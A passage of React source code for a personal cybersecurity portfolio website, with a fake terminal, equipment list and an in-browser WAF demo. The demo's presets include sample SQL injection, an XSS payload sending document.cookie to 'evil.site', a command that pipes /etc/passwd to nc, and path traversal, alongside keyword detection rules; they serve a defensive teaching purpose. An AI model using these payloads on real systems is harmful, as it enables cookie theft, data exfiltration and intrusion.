      exit={{ opacity: 0, scale: 0.98 }}
      transition={{ duration: 0.5 }}
    >
      <div className="welcome-card">
        <div className="welcome-header">
          <div className="welcome-badge">
            <span className="blinking-dot" /> SECURE BOOT // PROTOCOL 0x4B20
          </div>
          <span style={{ fontSize: "10px", color: "#64748b" }}>GEC // BHUBANESWAR</span>
        </div>
        <div className="welcome-body">
          {logs.map((log, idx) => (
            <div key={idx} className={idx === logs.length - 1 ? "welcome-line" : "welcome-line-dim"}>
              <span style={{ color: "#1dd05d", marginRight: "6px" }}>&gt;</span> {log}
            </div>
          ))}
          <div className="welcome-progress-wrap">
            <div className="welcome-progress-bar" style={{ width: `${percent}%` }} />
          </div>
        </div>
        <div className="welcome-footer">
          <span className="welcome-percent">{percent}% COMPLETE</span>
          <button type="button" className="welcome-skip-btn" onClick={onComplete}>
            SKIP [ESC]
          </button>
        </div>
      </div>
    </motion.div>
  );
}

// Interactive CTF Cipher Challenge Component
function CtfChallenge({ soundEnabled }) {
  const [solved, setSolved] = useState(false);
  const [decrypting, setDecrypting] = useState(false);
  const cipherText = "TklIQVIgUkFOSkFOIE1PSEFQQVRSQSB8fCBHRUMgQVVUT05PTU9VUw==";

  const handleDecrypt = () => {
    playSound("click", soundEnabled);
    setDecrypting(true);
    setTimeout(() => {
      setSolved(true);
      setDecrypting(false);
      playSound("success", soundEnabled);
    }, 700);
  };

  return (
    <div className="ctf-box">
      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
        <div>
          <span className="academic-badge" style={{ marginBottom: "6px" }}>
            <LockKey size={13} weight="bold" /> CTF CIPHER CHALLENGE
          </span>
          <h3 style={{ margin: 0, fontSize: "18px" }}>Decode Encrypted System Banner</h3>
        </div>
        <button
          type="button"
          className="button button-primary button-small"
          onClick={handleDecrypt}
          disabled={decrypting || solved}
        >
          {solved ? "Flag Decrypted" : decrypting ? "Decrypting..." : "Decrypt Cipher"}
        </button>
      </div>

      <div className="ctf-screen">
        <p style={{ margin: 0, color: "#94a3b8" }}>
          // ENCRYPTED PAYLOAD (Base64 ASCII):
        </p>
        <p style={{ margin: "6px 0", color: "#38bdf8", fontWeight: 700 }}>
          {cipherText}
        </p>
        {solved ? (
          <motion.div
            initial={{ opacity: 0, y: 6 }}
            animate={{ opacity: 1, y: 0 }}
            style={{ marginTop: "10px", padding: "8px 12px", background: "rgba(29, 208, 93, 0.15)", border: "1px solid #1dd05d", borderRadius: "8px", color: "#1dd05d" }}
          >
            [✓] DECRYPTED PAYLOAD: <strong>NIHAR RANJAN MOHAPATRA || GEC AUTONOMOUS [FLAG: CTF&#123;CYBER_DEFENSE_2026&#125;]</strong>
          </motion.div>
        ) : (
          <p style={{ margin: "4px 0 0", color: "#64748b", fontSize: "11px" }}>
            Hit "Decrypt Cipher" to run the local cryptographic routine.
          </p>
        )}
      </div>
    </div>
  );
}

// Live Threat Defense Radar / Node Ping Latency
function DefenseRadar() {
  const [latencies, setLatencies] = useState({
    cloudflare: 12,
    google: 18,
    quad9: 15,
  });

  useEffect(() => {
    const interval = setInterval(() => {
      setLatencies({
        cloudflare: Math.floor(10 + Math.random() * 6),
        google: Math.floor(16 + Math.random() * 8),
        quad9: Math.floor(13 + Math.random() * 7),
      });
    }, 2800);
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="radar-grid">
      <div className="radar-card">
        <div className="radar-info">
          <h4><ShieldCheck size={16} weight="fill" style={{ color: "#1dd05d" }} /> Cloudflare 1.1.1.1</h4>
          <p>Primary Encrypted Resolver</p>
        </div>
        <span className="radar-latency">{latencies.cloudflare}ms</span>
      </div>

      <div className="radar-card">
        <div className="radar-info">
          <h4><ShieldCheck size={16} weight="fill" style={{ color: "#1dd05d" }} /> Google DNS 8.8.8.8</h4>
          <p>Global Secondary Probe</p>
        </div>
        <span className="radar-latency">{latencies.google}ms</span>
      </div>

      <div className="radar-card">
        <div className="radar-info">
          <h4><ShieldCheck size={16} weight="fill" style={{ color: "#1dd05d" }} /> Quad9 Threat Defense</h4>
          <p>Malware & Botnet Blocking</p>
        </div>
        <span className="radar-latency">{latencies.quad9}ms</span>
      </div>
    </div>
  );
}

function useTheme() {
  const [theme, setTheme] = useState(() => {
    if (typeof window === "undefined") return "light";
    return (
      localStorage.getItem("nrm-theme") ||
      (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light")
    );
  });

  useEffect(() => {
    document.documentElement.dataset.theme = theme;
    localStorage.setItem("nrm-theme", theme);
  }, [theme]);

  return [theme, () => setTheme((current) => (current === "dark" ? "light" : "dark"))];
}

function Reveal({ children, className = "", delay = 0 }) {
  const reduceMotion = useReducedMotion();
  return (
    <motion.div
      className={className}
      initial={reduceMotion ? false : { opacity: 0, y: 18 }}
      whileInView={{ opacity: 1, y: 0 }}
      viewport={{ once: true, amount: 0.15 }}
      transition={{ duration: 0.5, delay, ease: [0.2, 0.7, 0.2, 1] }}
    >
      {children}
    </motion.div>
  );
}

// Dinesh's Signature Theme Switcher
function ThemeToggle({ theme, toggleTheme, soundEnabled }) {
  const handleClick = () => {
    playSound("click", soundEnabled);
    toggleTheme();
  };

  return (
    <div className="theme-toggle-wrap">
      <button
        type="button"
        className="theme-toggle-btn"
        onClick={handleClick}
        aria-label={`Switch to ${theme === "dark" ? "light" : "dark"} theme`}
        title={`Switch to ${theme === "dark" ? "light" : "dark"} theme`}
      >
        <Sun size={13} weight="bold" />
        <Moon size={13} weight="fill" />
        <span className="theme-toggle-ball" />
      </button>
    </div>
  );
}

function Header({ theme, toggleTheme, soundEnabled, toggleSound }) {
  const [menuOpen, setMenuOpen] = useState(false);
  const closeMenu = () => setMenuOpen(false);
  const nav = [
    ["Home", "/"],
    ["Deployments", "/projects"],
    ["Security Tests", "/#security-tests"],
    ["Skills", "/#skills"],
    ["CVEs", "/#advisories"],
    ["Equipment", "/#equipment"],
    ["Packet Stream", "/#packet-stream"],
    ["Entropy Lab", "/#entropy-lab"],
    ["Terminal", "/#terminal"],
    ["Contact", "/contact"],
  ];

  return (
    <header className="site-header">
      <div className="nav-shell">
        <Link className="brand" to="/" aria-label="Nihar Ranjan Mohapatra home" onClick={closeMenu}>
          <span className="brand-mark">NRM</span>
          <span className="brand-name">
            Nihar Ranjan<br />Mohapatra
          </span>
        </Link>
        <nav className={`main-nav ${menuOpen ? "is-open" : ""}`} aria-label="Main navigation">
          {nav.map(([label, to]) => (
            <NavLink
              key={label}
              to={to}
              end={to === "/"}
              onClick={closeMenu}
              className={({ isActive }) => (isActive ? "nav-link active" : "nav-link")}
            >
              {label}
            </NavLink>
          ))}
          <div className="mobile-nav-actions">
            <button
              type="button"
              className={`sound-toggle-btn ${soundEnabled ? "active" : ""}`}
              onClick={toggleSound}
              title={soundEnabled ? "Mute sound effects" : "Enable sound effects"}
            >
              {soundEnabled ? <SpeakerHigh size={16} /> : <SpeakerSlash size={16} />}
            </button>
            <ThemeToggle theme={theme} toggleTheme={toggleTheme} soundEnabled={soundEnabled} />
            <a className="button button-primary button-small" href="/resume.pdf" download>
              Resume <ArrowDownRight size={15} weight="bold" />
            </a>
          </div>
        </nav>
        <div className="nav-actions">
          <button
            type="button"
            className={`sound-toggle-btn ${soundEnabled ? "active" : ""}`}
            onClick={toggleSound}
            title={soundEnabled ? "Mute sound effects" : "Enable sound effects"}
          >
            {soundEnabled ? <SpeakerHigh size={16} /> : <SpeakerSlash size={16} />}
          </button>
          <ThemeToggle theme={theme} toggleTheme={toggleTheme} soundEnabled={soundEnabled} />
          <a className="button button-primary button-small resume-link" href="/resume.pdf" download>
            Resume <ArrowDownRight size={15} weight="bold" />
          </a>
          <button
            className="menu-toggle"
            type="button"
            aria-label={menuOpen ? "Close menu" : "Open menu"}
            aria-expanded={menuOpen}
            onClick={() => setMenuOpen((open) => !open)}
          >
            {menuOpen ? <X size={20} /> : <List size={20} />}
          </button>
        </div>
      </div>
    </header>
  );
}

function Footer() {
  const [istTime, setIstTime] = useState("");

  useEffect(() => {
    const updateTime = () => {
      const now = new Date();
      const options = {
        timeZone: "Asia/Kolkata",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
        hour12: true,
      };
      setIstTime(new Intl.DateTimeFormat("en-IN", options).format(now));
    };
    updateTime();
    const interval = setInterval(updateTime, 1000);
    return () => clearInterval(interval);
  }, []);

  return (
    <footer className="site-footer">
      <div className="container">
        <div className="footer-main">
          <div className="footer-intro">
            <Link className="brand footer-brand" to="/">
              <span className="brand-mark">NRM</span>
              <span className="brand-name">
                Nihar Ranjan<br />Mohapatra
              </span>
            </Link>
            <p>Computer Science Engineer & Cyber Security Specialist based in Bhubaneswar, Odisha, India.</p>
            <div className="now-card">
              <span className="now-icon"><ShieldCheck size={18} weight="fill" /></span>
              <span>
                <strong>Trainee System Engineer</strong>
                <small>Cyfen Labs Private Limited</small>
              </span>
            </div>
          </div>
          <div className="footer-column">
            <h2>Connect & Code</h2>
            <a href="https://github.com/papun-00" target="_blank" rel="noreferrer">
              GitHub (papun-00) <ArrowUpRight size={13} />
            </a>
            <a href="https://x.com/niharranjan00" target="_blank" rel="noreferrer">
              Twitter / X (@niharranjan00) <ArrowUpRight size={13} />
            </a>
            <a href="https://instagram.com/nihar_x622._" target="_blank" rel="noreferrer">
              Instagram (@nihar_x622._) <ArrowUpRight size={13} />
            </a>
            <a href="mailto:nmohapatra079@gmail.com">
              Email (nmohapatra079) <ArrowUpRight size={13} />
            </a>
          </div>
          <div className="footer-column">
            <h2>Explore Hub</h2>
            <Link to="/#about">Dossier / About 👤</Link>
            <Link to="/projects">Projects Vault 🚀</Link>
            <Link to="/#security-tests">Security Tests 🧪</Link>
            <Link to="/#advisories">CVE Research 🚨</Link>
            <Link to="/#equipment">Equipment Arsenal 🛠️</Link>
            <Link to="/#packet-stream">Packet Stream 📡</Link>
            <Link to="/#entropy-lab">Entropy Lab 🛡️</Link>
            <Link to="/#skills">Technical Skills ⚡</Link>
            <Link to="/#education">Education & Certs 🎓</Link>
            <Link to="/#interests">Personal Interests 🌈</Link>
            <Link to="/#terminal">Interactive CLI 💻</Link>
          </div>
          <div className="footer-column">
            <h2>Location & Telemetry</h2>
            <p style={{ margin: 0, fontSize: "11px", color: "var(--para-gray-color)", lineHeight: 1.6 }}>
              📍 Bhubaneswar, Odisha, India<br />
              Coordinates: 20.2961° N, 85.8245° E<br />
              Local Time: {istTime || "Loading..."} IST
            </p>
            <a href="/resume.pdf" download className="button button-outline button-small" style={{ marginTop: "10px" }}>
              Download PDF Resume <ArrowDownRight size={14} />
            </a>
          </div>
        </div>
        <div className="footer-bottom">
          <span>Designed & Engineered by Nihar Ranjan Mohapatra</span>
          <span>© 2026 • Building the Digital Future</span>
          <a href="mailto:nmohapatra079@gmail.com">nmohapatra079@gmail.com</a>
        </div>
      </div>
    </footer>
  );
}

function Layout({ children, theme, toggleTheme, soundEnabled, toggleSound, isAmbient, toggleAmbient }) {
  const location = useLocation();

  useEffect(() => {
    const title = location.pathname.startsWith("/projects/")
      ? "Project Case Study | Nihar Ranjan Mohapatra"
      : location.pathname.startsWith("/blogs/")
        ? "Engineering Notes | Nihar Ranjan Mohapatra"
        : {
            "/": "Nihar Ranjan Mohapatra | Cyber Security & CSE Scholar | Full Stack Developer",
            "/projects": "Projects Vault | Nihar Ranjan Mohapatra",
            "/blogs": "Research & Notes | Nihar Ranjan Mohapatra",
            "/contact": "Contact & Transmission | Nihar Ranjan Mohapatra",
          }[location.pathname] || "Nihar Ranjan Mohapatra | Cyber Security & CSE Scholar";
    document.title = title;

    if (location.hash) {
      requestAnimationFrame(() => document.querySelector(location.hash)?.scrollIntoView());
    } else {
      window.scrollTo({ top: 0, behavior: "instant" });
    }
  }, [location.pathname, location.hash]);

  return (
    <>
      <a className="skip-link" href="#main-content">Skip to content</a>
      <CyberCanvas />
      <Header
        theme={theme}
        toggleTheme={toggleTheme}
        soundEnabled={soundEnabled}
        toggleSound={toggleSound}
      />
      <main id="main-content">{children}</main>
      <Footer />
      <FloatingDock
        theme={theme}
        toggleTheme={toggleTheme}
        soundEnabled={soundEnabled}
        toggleSound={toggleSound}
        isAmbient={isAmbient}
        toggleAmbient={toggleAmbient}
      />
    </>
  );
}

function SectionTitle({ title, text, action }) {
  return (
    <div className="section-title">
      <div>
        <h2>{title}</h2>
        {text && <p>{text}</p>}
      </div>
      {action}
    </div>
  );
}

function ProjectCard({ project, index = 0, featured = false }) {
  return (
    <Reveal className={`project-card ${featured ? "project-card-featured" : ""}`} delay={index * 0.08}>
      <Link to={`/projects/${project.slug}`} className="project-image-link" aria-label={`Read ${project.title} project details`}>
        <img src={image(project.image)} alt={`${project.title} preview`} loading="lazy" />
        <span className="image-arrow"><ArrowUpRight size={19} weight="bold" /></span>
      </Link>
      <div className="project-info">
        <div className="project-meta"><span>{project.category}</span><span>{project.year}</span></div>
        <h3><Link to={`/projects/${project.slug}`}>{project.title}</Link></h3>
        <p>{project.summary}</p>
        <div className="tag-row">{project.tags.map((tag) => <span className="tag" key={tag}>{tag}</span>)}</div>
        <div className="project-actions">
          <Link className="text-link" to={`/projects/${project.slug}`}>View architecture <ArrowRight size={15} /></Link>
          <a className="text-link" style={{ color: "var(--para-gray-color)", fontSize: "11px" }} href={project.github} target="_blank" rel="noreferrer">
            GitHub repo <ArrowUpRight size={13} />
          </a>
        </div>
      </div>
    </Reveal>
  );
}

// Interactive CLI Terminal Component
function CliTerminal({ soundEnabled }) {
  const [input, setInput] = useState("");
  const [history, setHistory] = useState([
    {
      cmd: "nihar --whoami",
      output:
        "Nihar Ranjan Mohapatra — Computer Science Engineer & Cyber Security Specialist\nBhubaneswar, Odisha, India | Gandhi Engineering College (8.6 CGPA)\nTrainee System Engineer Intern at Cyfen Labs Private Limited",
    },
  ]);

  const runCommand = (cmdStr) => {
    playSound("click", soundEnabled);
    const trimmed = cmdStr.trim().toLowerCase();
    if (!trimmed) return;
    if (trimmed === "clear") {
      setHistory([]);
      setInput("");
      return;
    }

    let out = "";
    switch (trimmed) {
      case "help":
        out =
          "AVAILABLE COMMANDS:\n- whoami        : Identity, role, and core specialization\n- skills        : Core programming languages and technical arsenal\n- projects      : Featured software & security projects\n- advisories    : Disclosed CVE security vulnerability research\n- equipment     : Hardware & security lab inventory (12 hardware items)\n- arsenal       : Hardware & software security lab inventory\n- education     : Formal academic degrees and institutions\n- experience    : Corporate internship and development roles\n- interests     : Personal passions across technology, nature & exploration\n- certs         : Industry certifications & accreditations\n- contact       : Direct email, GitHub, and social channels\n- clear         : Clear the terminal console output";
        break;
      case "whoami":
        out =
          "Nihar Ranjan Mohapatra\nRole: Computer Science Engineering Scholar & Cyber Security Specialist\nLocation: Bhubaneswar, Odisha, India\nCollege: Gandhi Engineering College (GEC Autonomous College) • 8.6 CGPA\nInternship: Trainee System Engineer Intern @ Cyfen Labs Private Limited\nPhilosophy: 'Security is not an afterthought—it is the foundational architecture upon which the digital future must be built.'";
        break;
      case "skills":
        out =
          "TECHNICAL ARSENAL:\n- Python [90%]          : Scapy raw packets, exploit automation, network scanning\n- C / C++ [85%]         : Memory safety, pointers, buffer overflow defense\n- Cyber Security [92%]  : OWASP Top 10, penetration testing, threat modeling\n- Networking [87%]      : Wireshark, TCP/IP, OSI stack, firewall rules\n- Linux Systems [88%]   : Arch / Kali / Ubuntu, Bash scripting, system hardening\n- Cryptography [86%]    : AES-256-GCM, Argon2id, zero-knowledge storage\n- HTML5 & CSS3 [95%]    : Modern responsive layouts, Tailwind, WCAG a11y\n- JavaScript/React [88%]: Asynchronous systems, component design, Motion";
        break;
      case "projects":
        out =
          "FEATURED DEPLOYMENTS:\n1. SentinelGuard : AI-Powered Network Packet Analyzer & Intrusion Detection (Scapy, C++)\n2. CipherVault   : Zero-Knowledge Multi-Tier Cryptographic Locker (AES-256-GCM, Argon2id)\n3. NetRecon      : Automated Attack Surface Mapper & Port Scanner (Python Sockets)\n4. WebShield     : Automated OWASP Security Auditor & Header Hardener\n5. Alashore      : Marine Supply & Logistics Enterprise Web Portal (Rust, HTML)\n6. Nexovate      : Digital Creative Agency & Media Showcase Platform";
        break;
      case "advisories":
        out =
          "CVE RESEARCH & DISCLOSURES:\n- SEC-ADV-2026-01 [CVSS 8.8]: IDOR & Horizontal Escalation in Telemetry APIs\n- SEC-ADV-2026-02 [CVSS 8.2]: Blind Time-Based SQL Injection in Directory Search\n- SEC-ADV-2026-03 [CVSS 7.4]: Covert Data Exfiltration via DNS Tunneling Heuristics";
        break;
      case "equipment":
      case "arsenal":
        out =
          "HARDWARE ARSENAL & LAB EQUIPMENT (12 Items):\n" +
          "1. Apple MacBook Pro M-Series (16GB RAM) - Primary Engineering Powerhouse\n" +
          "2. Lenovo ThinkPad T-Series (Arch/Kali Dual-Boot) - Dedicated Security Rig\n" +
          "3. Raspberry Pi 5 8GB Node - 24/7 Honeypot & WireGuard Bastion\n" +
          "4. Flipper Zero + Wi-Fi Dev Board - Sub-1GHz, RFID, NFC & BadUSB\n" +
          "5. Hak5 Rubber Ducky & Bash Bunny - Keystroke Injection & Quick Triage\n" +
          "6. RTL-SDR Blog v4 Radio Receiver - 500kHz-1.7GHz RF Signal Interception\n" +
          "7. Alfa AWUS036ACM 802.11ac - Dual-band Wi-Fi Packet Injection & Monitor\n" +
          "8. Ubiquiti UniFi Security Gateway - Hardware DPI, Segmented Lab VLANs\n" +
          "9. Managed 8-Port Gigabit Switch - Hardware SPAN Port for Packet Tapping\n" +
          "10. Keychron Custom Mechanical Keyboard - Tactile Switches & VIA Layout\n" +
          "11. Sony WH-1000XM5 ANC - Acoustic Shielding for Focused Threat Modeling\n" +
          "12. Encrypted 2TB NVMe Forensic Disk - Cold LUKS2/APFS Storage Vault";
        break;
      case "education":
        out =
          "ACADEMICS:\n1. B.Tech in CSE (Specialization in Cyber Security)\n   Gandhi Engineering College (GEC Autonomous College), Bhubaneswar\n   Current CGPA: 8.6 | Expected Graduation: 2027\n2. Diploma in Engineering (CSE Track)\n   BIT Polytechnic, Odisha | Graduated with Distinction";
        break;
      case "experience":
        out =
          "EXPERIENCE:\n- Trainee System Engineer Intern | Cyfen Labs Private Limited (March 2026 - Present)\n  Working on live corporate systems, security architecture, network telemetry & tools.\n- Independent Systems & Security Developer (2024 - Present)\n  Building open-source security tools, packet analyzers, and resilient web applications.";
        break;
      case "interests":
        out =
          "PERSONAL INTERESTS (SPECTRUM):\n1. ⚡ Technology & Silicon : Next-gen compute, AI guardrails, kernel internals\n2. 🔐 Cyber Security      : CTF challenges (HTB/THM), threat modeling, zero-trust\n3. 🌿 Nature & Equilibrium: Odisha's coastal horizons (Puri, Chilika, Deomali)\n4. ✈️ Travelling          : Backpacking historic architecture, mountain trails\n5. 💡 Tool Crafting       : Automation scripts, microcontroller hardware projects";
        break;
      case "certs":
      case "certifications":
        out =
          "CERTIFICATIONS:\n- Certified Ethical Hacker (CEH) Practical Track (Offensive Security)\n- Google Cybersecurity Professional Certificate (SIEM, Forensics & Python)\n- Cisco Networking Academy: Network Defense (Routing, ACLs, Wireshark)\n- Linux Professional & System Hardening (Kernel Security)";
        break;
      case "contact":
        out =
          "COMMUNICATION CHANNELS:\n- Email    : nmohapatra079@gmail.com\n- GitHub   : https://github.com/papun-00\n- Twitter  : https://x.com/niharranjan00\n- Instagram: https://instagram.com/nihar_x622._\n- Location : Bhubaneswar, Odisha, India";
        break;
      default:
        out = `Command not recognized: "${trimmed}". Type "help" to see all valid commands.`;
    }

    setHistory((prev) => [...prev, { cmd: cmdStr, output: out }]);
    setInput("");
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    runCommand(input);
  };

  const chips = ["whoami", "skills", "projects", "advisories", "equipment", "education", "interests", "certs", "contact", "help"];

  return (
    <div className="terminal-window">
      <div className="terminal-bar">
        <div className="terminal-dots">
          <span className="terminal-dot dot-red" />
          <span className="terminal-dot dot-yellow" />
          <span className="terminal-dot dot-green" />
        </div>
        <div className="terminal-title">guest@nihar-system: ~ (interactive shell)</div>
        <div style={{ fontSize: "10px", color: "#64748b" }}>zsh</div>
      </div>
      <div className="terminal-body">
        <div style={{ color: "#94a3b8", fontSize: "11px", marginBottom: "6px" }}>
          Type a command below or tap a quick-pill to execute. (e.g. `whoami`, `skills`, `projects`, `advisories`, `arsenal`)
        </div>
        {history.map((item, idx) => (
          <div key={idx} className="terminal-entry">
            <div className="terminal-cmd">{item.cmd}</div>
            <div className="terminal-output">{item.output}</div>
          </div>
        ))}
      </div>
      <form className="terminal-form" onSubmit={handleSubmit}>
        <span className="terminal-prompt">$</span>
        <input
          type="text"
          className="terminal-input"
          value={input}
          onChange={(e) => setInput(e.target.value)}
          placeholder="type 'help', 'skills', 'advisories', 'arsenal'..."
          aria-label="Terminal command input"
        />
        <button type="submit" className="button button-primary button-small" style={{ minHeight: "34px", padding: "0 14px", fontSize: "11px" }}>
          Run
        </button>
      </form>
      <div style={{ padding: "10px 18px 14px", background: "#060512" }}>
        <div className="terminal-chips">
          <span className="terminal-chip-label">Quick Commands:</span>
          {chips.map((chip) => (
            <button
              key={chip}
              type="button"
              className="terminal-chip"
              onClick={() => runCommand(chip)}
            >
              {chip}
            </button>
          ))}
        </div>
      </div>
    </div>
  );
}

// Live Status & Telemetry Hub
function TelemetryHub({ soundEnabled }) {
  const [istTime, setIstTime] = useState("");
  const [ghStats, setGhStats] = useState({ repos: 14, followers: 2, stars: 2 });
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    const updateTime = () => {
      const now = new Date();
      setIstTime(
        new Intl.DateTimeFormat("en-IN", {
          timeZone: "Asia/Kolkata",
          hour: "2-digit",
          minute: "2-digit",
          second: "2-digit",
          hour12: true,
        }).format(now)
      );
    };
    updateTime();
    const timer = setInterval(updateTime, 1000);

    // Fetch dynamic GitHub stats
    fetch("https://api.github.com/users/papun-00")
      .then((res) => res.json())
      .then((data) => {
        if (data && data.public_repos !== undefined) {
          setGhStats((prev) => ({
            ...prev,
            repos: data.public_repos,
            followers: data.followers || prev.followers,
          }));
        }
      })
      .catch(() => {});

    return () => clearInterval(timer);
  }, []);

  const handleCopyEmail = () => {
    playSound("click", soundEnabled);
    navigator.clipboard.writeText("nmohapatra079@gmail.com");
    setCopied(true);
    setTimeout(() => setCopied(false), 2200);
  };

  return (
    <div className="telemetry-strip">
      <div className="telemetry-card">
        <div className="telemetry-label">
          <span className="telemetry-pulse" /> Live Telemetry
        </div>
        <div className="telemetry-val">{istTime || "12:00:00 PM"} IST</div>
        <div className="telemetry-sub">Bhubaneswar, Odisha (20.2961° N)</div>
      </div>

      <div className="telemetry-card">
        <div className="telemetry-label">
          <GithubLogo size={14} /> GitHub Status
        </div>
        <div className="telemetry-val">{ghStats.repos}+ Repositories</div>
        <div className="telemetry-sub">github.com/papun-00 (Active)</div>
      </div>

      <div className="telemetry-card">
        <div className="telemetry-label">
          <ShieldCheck size={14} /> Corporate Role
        </div>
        <div className="telemetry-val">Trainee System Eng.</div>
        <div className="telemetry-sub">Cyfen Labs Private Limited</div>
      </div>

      <div className="telemetry-card">
        <div className="telemetry-label">
          <EnvelopeSimple size={14} /> Direct Transmission
        </div>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginTop: "2px" }}>
          <span className="telemetry-val" style={{ fontSize: "14px" }}>nmohapatra079</span>
          <button
            type="button"
            className={`copy-btn ${copied ? "copied" : ""}`}
            onClick={handleCopyEmail}
            title="Copy email to clipboard"
          >
            {copied ? <Check size={12} weight="bold" /> : <Copy size={12} />}
            {copied ? "Copied" : "Copy"}
          </button>
        </div>
        <div className="telemetry-sub">B.Tech CSE Cyber Security (8.6 CGPA)</div>
      </div>
    </div>
  );
}

// Dedicated Hardware & Lab Equipment Section Component
function EquipmentSection({ soundEnabled }) {
  const [activeCategory, setActiveCategory] = useState("All");
  const categories = [
    "All",
    "Compute & Systems",
    "Hardware Pentest",
    "Network & Infrastructure",
    "Desk & Peripherals",
  ];

  const filteredEquipment = useMemo(() => {
    if (activeCategory === "All") return equipmentData;
    return equipmentData.filter((item) => item.category === activeCategory);
  }, [activeCategory]);

  return (
    <section className="section container" id="equipment">
      <span id="arsenal" style={{ position: "relative", top: "-80px", display: "block" }} />
      <SectionTitle
        title="Hardware & Lab Equipment Arsenal"
        text="Dedicated engineering workstations, specialized hardware penetration testing tools, RF signal receivers, and isolated lab networking infrastructure."
        action={
          <div className="filter-row">
            {categories.map((cat) => (
              <button
                key={cat}
                type="button"
                className={`filter-pill ${activeCategory === cat ? "selected" : ""}`}
                onClick={() => {
                  playSound("click", soundEnabled);
                  setActiveCategory(cat);
                }}
              >
                {cat}
              </button>
            ))}
          </div>
        }
      />
      <div className="equipment-grid">
        {filteredEquipment.map((eq, idx) => {
          const Icon = eq.icon;
          return (
            <Reveal key={eq.id} className="equipment-card" delay={idx * 0.04}>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                <div className="equipment-icon-wrap">
                  <Icon size={20} weight="regular" />
                </div>
                <span className="equipment-badge">{eq.status}</span>
              </div>
              <span className="academic-badge" style={{ fontSize: "10px", marginTop: "4px" }}>
                {eq.category}
              </span>
              <h4>{eq.name}</h4>
              <p>{eq.role}</p>
              <div className="equipment-specs">
                {eq.specs.map((spec) => (
                  <span key={spec} className="spec-tag">{spec}</span>
                ))}
              </div>
            </Reveal>
          );
        })}
      </div>
    </section>
  );
}

// ==========================================================================
// FEATURE: INTERACTIVE CYBER SECURITY TESTING SUITE & VULNERABILITY AUDIT
// ==========================================================================
function SecurityTestingSuite({ soundEnabled }) {
  const [activeTab, setActiveTab] = useState("waf"); // "waf" | "headers" | "scanner" | "crypto"

  // 1. WAF & Injection Test State
  const [payloadInput, setPayloadInput] = useState("' OR '1'='1' --");
  const [copiedSanitized, setCopiedSanitized] = useState(false);

  const wafPresets = [
    { label: "SQLi (Auth Bypass)", payload: "' OR 1=1 --" },
    { label: "SQLi (Union Extract)", payload: "UNION SELECT 1, user(), @@version --" },
    { label: "XSS (Script Tag)", payload: "<script>alert('pwned')</script>" },
    { label: "XSS (Event Handler)", payload: "<img src=x onerror=\"fetch('//evil.site/'+document.cookie)\">" },
    { label: "RCE / Command Injection", payload: "; cat /etc/passwd | nc 10.0.0.1 4444" },
    { label: "Path Traversal (LFI)", payload: "../../../../../../etc/shadow" },
    { label: "Clean API Query", payload: "GET /api/v1/user?id=1042&role=analyst" },
  ];

  const wafVerdict = useMemo(() => {
    const p = payloadInput.toLowerCase();
    if (p.includes("' or") || p.includes("union select") || p.includes("--") || p.includes("1=1") || p.includes("@@version")) {
      return {
        status: "BLOCKED",
        risk: "CRITICAL",
        color: "#ef4444",
        cwe: "CWE-89: SQL Injection",
        rule: "OWASP CRS 942100 (SQLi Pattern Match)",
        sanitized: payloadInput.replace(/'/g, "''").replace(/--/g, ""),
        mitigation: "Enforce Parameterized Prepared Statements (PDO / PreparedStatement) and strict ORM typecasting.",
      };
    }
    if (p.includes("<script") || p.includes("onerror=") || p.includes("javascript:") || p.includes("onload=") || p.includes("<img")) {
      return {
        status: "BLOCKED",
        risk: "HIGH",
        color: "#f59e0b",
        cwe: "CWE-79: Cross-Site Scripting (XSS)",
        rule: "OWASP CRS 941100 (XSS Filter Violation)",
        sanitized: payloadInput.replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;"),
        mitigation: "Apply Context-Aware HTML Entity Escaping (DOMPurify) and declare a strict Content-Security-Policy (CSP).",
      };
    }
    if (p.includes("cat /etc") || p.includes("|") || p.includes("nc ") || p.includes("; ") || p.includes("$(whoami)") || p.includes("`id`")) {
      return {
        status: "BLOCKED",
        risk: "CRITICAL",
        color: "#ef4444",
        cwe: "CWE-78: OS Command Injection",
        rule: "OWASP CRS 932100 (Remote Code Execution Filter)",
        sanitized: payloadInput.replace(/[;&|`$]/g, ""),
        mitigation: "Avoid exec()/system() shells; use built-in SDK process executors with strict whitelist argument arrays.",
      };
    }
    if (p.includes("../") || p.includes("..\\") || p.includes("/etc/shadow") || p.includes("/etc/passwd")) {
      return {
        status: "BLOCKED",
        risk: "HIGH",
        color: "#f59e0b",
        cwe: "CWE-22: Path Traversal (LFI)",
        rule: "OWASP CRS 930100 (Directory Traversal Attack)",
        sanitized: payloadInput.replace(/\.\./g, ""),
        mitigation: "Normalize file paths with canonicalization checks (realpath) and restrict reads to a chrooted directory.",
      };
    }
    return {
      status: "ALLOWED",
      risk: "CLEAN",
      color: "#10b981",
      cwe: "None (Input Clean)",
      rule: "Baseline Inspection Passed",
      sanitized: payloadInput,
      mitigation: "Request passed regular WAF heuristic filters without triggering malicious signatures.",
    };
  }, [payloadInput]);

  const handleCopySanitized = () => {
    playSound("click", soundEnabled);
    navigator.clipboard?.writeText(wafVerdict.sanitized);
    setCopiedSanitized(true);
    setTimeout(() => setCopiedSanitized(false), 2000);
  };

  // 2. HTTP Headers & SSL/TLS Audit State
  const [headerTarget, setHeaderTarget] = useState("hardened"); // "hardened" | "standard" | "legacy"
  const headerPresets = {
    hardened: {
      name: "Tier-1 FinTech Vault (banking-vault.internal)",
      score: 98,
      grade: "A+",
      color: "#10b981",
      headers: [
        { name: "Content-Security-Policy", value: "default-src 'self'; script-src 'self' 'nonce-xyz'; object-src 'none';", status: "PASS", desc: "Prevents XSS, packet sniffing & malicious script injection" },
        { name: "Strict-Transport-Security (HSTS)", value: "max-age=63072000; includeSubDomains; preload", status: "PASS", desc: "Forces HTTPS for 2 years & registers in browser preload list" },
        { name: "X-Frame-Options", value: "DENY", status: "PASS", desc: "Protects against Clickjacking UI redress attacks" },
        { name: "X-Content-Type-Options", value: "nosniff", status: "PASS", desc: "Mitigates MIME confusion & script execution attacks" },
